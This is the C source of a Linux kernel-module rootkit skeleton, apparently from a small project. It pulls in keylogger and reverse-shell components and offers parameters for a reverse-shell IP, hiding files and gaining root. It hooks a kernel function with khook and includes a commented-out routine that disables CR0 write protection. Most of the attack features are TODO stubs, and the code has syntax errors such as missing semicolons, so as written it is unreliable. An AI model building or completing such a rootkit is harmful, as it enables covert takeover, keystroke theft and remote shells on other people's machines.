/**
 * @file    rootkit.c
 * @author  Aaron Lichtman, Arch Gupta  and Brandon Weidner
 * @brief   A rootkit. TODO: Expand description
 */
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/timer.h>
#include "arsenal/keylogger.c"
#include "arsenal/reverse-shell.c"
#include "khook/engine.c"

MODULE_AUTHOR("Aaron Lichtman");
MODULE_AUTHOR("Arch Gupta");
MODULE_AUTHOR("Brandon Weidner");
MODULE_DESCRIPTION("Linux rootkit.");
MODULE_VERSION("0.1");
MODULE_LICENSE("GPL");

/**
 * Module parameters are made writable by anyone.
 * Any interaction with the rootkit will be through a command like:
 * $ echo "1" > /sys/module/garden/parameters/get_root. This will
 * update the value of the get_root parameter. We can poll this value
 * intermittently and do things when it changes.
 **/

static char* rev_shell_ip = NULL;
module_param(rev_shell_ip, charp, 0770);
MODULE_PARM_DESC(rev_shell_ip, "IP Address for reverse shell.");
static char* hidden_file_prefix = NULL;
module_param(hidden_file_prefix, charp, 0770);
MODULE_PARM_DESC(hidden_file_prefix, "Prefix for hidden files.");
static bool escalate_privileges = false;
module_param(escalate_privileges, bool, 0770);
MODULE_PARM_DESC(escalate_privileges, "Toggle for escalating current user to root.");

/**
 * Data structures
 */

static struct timer_list polling_timer;

struct command_vals {
    // TODO: Add properties for each of the commands we can accept
    char* rev_shell_ip;
    // etc
}

static struct command_vals cmds;

/**
 * Function Headers
 */

void poll_for_commands();
void set_new_timer(const unsigned int msecs);
void setup_timer(struct timer_list* timer, void (*function)(unsigned long), unsigned long data);

// TODO: Figure out if this is needed at all.
// /**
//  * Overwrite the 16th bit in the CR0 register to disable write protection.
//  */
// void disable_write_protection() {
//     unsigned long value;
//     asm volatile("mov %%cr0,%0" : "=r"(value));
//     if (value & 0x00010000) {
//         value &= ~0x00010000;
//                 asm volatile("mov %0,%%cr0" ::"r"(value));
//     }
// }

// Hooking open syscall?
/**
KHOOK(fget);
static int khook_fget(unsigned int fd) {
    int original = KHOOK_ORIGIN(fget, fd);
    printk("%s(%d) = %d\n", __func__, fd, original);
    return original;
}
**/

// Example hook for testing build process.
KHOOK(inode_permission);
static int khook_inode_permission(struct inode* inode, int mask) {
    int ret = 0;
    ret = KHOOK_ORIGIN(inode_permission, inode, mask);
    printk("%s(%p, %08x) = %d\n", __func__, inode, mask, ret);
    return ret;
}

/**
 * Gives the current user root priveleges.
 **/
// static void get_root() {
//     // TODO
// }

void set_new_timer(const unsigned int msecs) {
    printk("Starting timer to fire in %u (%ld)\n", msecs, jiffies);
    if (mod_timer(&polling_timer, jiffies + msecs_to_jiffies(msecs))) {
        printk("Error setting timer.\n");
    }
}

/**
 * Check all parameters against last-known values and see if anything changed.
 * If yes, take the requested action.
 * Finally, start a timer to call this function again in the future.
 */
void poll_for_commands() {
    // TODO: Store previous values of variables somewhere.
    printk(KERN_INFO "Polling for commands!\n");
    if (rev_shell_ip) {
        printk(KERN_INFO "rev_shell_ip: %s\n", rev_shell_ip);
        // TODO: Set up reverse shell.
    }

    if (hidden_file_prefix) {
        // TODO: Set up hidden files.
    }

    // if (escalate_privileges) {
    //     get_root();
    // }

    set_new_timer(300);
}

/**
 * Rootkit module initialization.
 */
static int __init rootkit_init(void) {
    printk(KERN_INFO "Initializing rootkit.\n");
    printk(KERN_INFO "Initializing timer.\n");
    khook_init();
    // TODO: Populate cmds struct to be passed to poll_for_commands(data)
    cmds.rev_shell_ip = rev_shell_ip;
    // Set up timer to check for changes in the parameters, to detect commands being run.
    setup_timer(&polling_timer, poll_for_commands, 0);
    return 0;
}

/**
 * Called at exit. All cleanup should be done here.
 */
static void __exit rootkit_exit(void) {
    printk(KERN_INFO "Cleaning up rootkit.\n");
    khook_cleanup();
    del_timer(&polling_timer)
}

module_init(rootkit_init);
module_exit(rootkit_exit);
